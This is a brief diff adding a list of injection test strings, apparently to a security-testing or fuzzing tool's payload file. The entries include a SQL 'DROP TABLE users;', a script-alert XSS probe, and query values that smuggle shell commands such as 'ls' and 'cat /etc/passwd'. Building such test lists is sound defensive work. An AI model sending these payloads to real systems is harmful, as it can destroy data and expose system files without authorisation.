@@ -1,0 +1,6 @@
+add-payload 'uname -a'
+add-payload 'DROP TABLE users;'
+add-payload '/<script>alert('XSS')</script>'
+add-command '?id=1; ls'
+add-command '?id=1; cat /etc/passwd'
+
